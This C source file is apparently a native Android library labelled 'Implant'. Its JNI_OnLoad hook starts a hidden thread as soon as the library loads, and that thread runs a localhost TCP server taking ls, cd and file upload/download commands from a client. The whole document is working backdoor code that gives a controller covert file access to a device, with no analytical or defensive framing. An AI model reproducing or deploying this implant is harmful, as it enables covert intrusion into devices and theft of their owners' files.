#include <jni.h>
#include <android/log.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>
#include <stdlib.h>

#define PORT 50052
#define BUFFER_SIZE 4096

char cwd[PATH_MAX];

void *server_thread(void *arg) {
    __android_log_print(ANDROID_LOG_INFO, "Implant", "Server thread started");
    getcwd(cwd, sizeof(cwd));
    int server_fd, new_socket;
    struct sockaddr_in address;
    int addrlen = sizeof(address);
    char buffer[BUFFER_SIZE] = {0};

    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        __android_log_print(ANDROID_LOG_ERROR, "Implant", "Socket failed");
        return NULL;
    }

    // Allow address reuse
    int opt = 1;
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        __android_log_print(ANDROID_LOG_ERROR, "Implant", "Setsockopt failed");
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = htonl(INADDR_LOOPBACK);  // Use localhost instead of INADDR_ANY
    address.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        __android_log_print(ANDROID_LOG_ERROR, "Implant", "Bind failed");
        return NULL;
    }

    __android_log_print(ANDROID_LOG_INFO, "Implant", "Server bound to port %d", PORT);

    if (listen(server_fd, 3) < 0) {
        __android_log_print(ANDROID_LOG_ERROR, "Implant", "Listen failed");
        return NULL;
    }

    __android_log_print(ANDROID_LOG_INFO, "Implant", "Server listening");

    while (1) {
        if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) {
            __android_log_print(ANDROID_LOG_ERROR, "Implant", "Accept failed: %s", strerror(errno));
            continue;
        }
        __android_log_print(ANDROID_LOG_INFO, "Implant", "Accepted connection from client");

        while (1) {
            memset(buffer, 0, BUFFER_SIZE);
            int valread = read(new_socket, buffer, BUFFER_SIZE);
            if (valread <= 0) break;

            char *cmd = strtok(buffer, " \n");
            if (!cmd) continue;

            if (strcmp(cmd, "ls") == 0) {
                char *path = strtok(NULL, " \n");
                if (!path) path = cwd;

                DIR *dir = opendir(path);
                if (dir) {
                    struct dirent *entry;
                    while ((entry = readdir(dir)) != NULL) {
                        write(new_socket, entry->d_name, strlen(entry->d_name));
                        write(new_socket, "\n", 1);
                    }
                    closedir(dir);
                } else {
                    write(new_socket, "Error opening directory\n", 24);
                }
                write(new_socket, "\0", 1); // end of response
            } else if (strcmp(cmd, "cd") == 0) {
                char *path = strtok(NULL, " \n");
                if (path && chdir(path) == 0) {
                    getcwd(cwd, sizeof(cwd));
                    write(new_socket, cwd, strlen(cwd));
                    write(new_socket, "\n", 1);
                } else {
                    write(new_socket, "Error changing directory\n", 26);
                }
                write(new_socket, "\0", 1);
            } else if (strcmp(cmd, "cp") == 0) {
                char *src = strtok(NULL, " \n");
                char *dst = strtok(NULL, " \n");
                char *direction = strtok(NULL, " \n");
                if (strcmp(direction, "upload") == 0) {
                    // from server to implant
                    int size;
                    read(new_socket, &size, sizeof(int));
                    char *data = malloc(size);
                    read(new_socket, data, size);
                    int fd = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0644);
                    if (fd >= 0) {
                        write(fd, data, size);
                        close(fd);
                        write(new_socket, "OK\n", 3);
                    } else {
                        write(new_socket, "Error\n", 6);
                    }
                    free(data);
                } else if (strcmp(direction, "download") == 0) {
                    // from implant to server
                    int fd = open(src, O_RDONLY);
                    if (fd >= 0) {
                        struct stat st;
                        if (fstat(fd, &st) == 0 && S_ISDIR(st.st_mode)) {
                            // It's a directory, send size 0
                            off_t zero = 0;
                            write(new_socket, &zero, sizeof(off_t));
                        } else {
                            off_t size = lseek(fd, 0, SEEK_END);
                            if (size == -1) {
                                // Error getting size, send 0
                                off_t zero = 0;
                                write(new_socket, &zero, sizeof(off_t));
                                close(fd);
                            } else {
                                lseek(fd, 0, SEEK_SET);
                                char *data = malloc(size);
                                read(fd, data, size);
                                close(fd);
                                write(new_socket, &size, sizeof(off_t));
                                write(new_socket, data, size);
                                free(data);
                            }
                        }
                        close(fd);
                    } else {
                        off_t zero = 0;
                        write(new_socket, &zero, sizeof(off_t));
                    }
                }
            }
        }
        close(new_socket);
    }
    close(server_fd);
    return NULL;
}

JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM *vm, void *reserved) {
    __android_log_print(ANDROID_LOG_INFO, "Implant", "JNI_OnLoad called");
    pthread_t thread;
    int result = pthread_create(&thread, NULL, server_thread, NULL);
    if (result != 0) {
        __android_log_print(ANDROID_LOG_ERROR, "Implant", "Failed to create thread: %d", result);
        return JNI_ERR;
    }
    __android_log_print(ANDROID_LOG_INFO, "Implant", "Thread created successfully");
    pthread_detach(thread);

    return JNI_VERSION_1_6;
}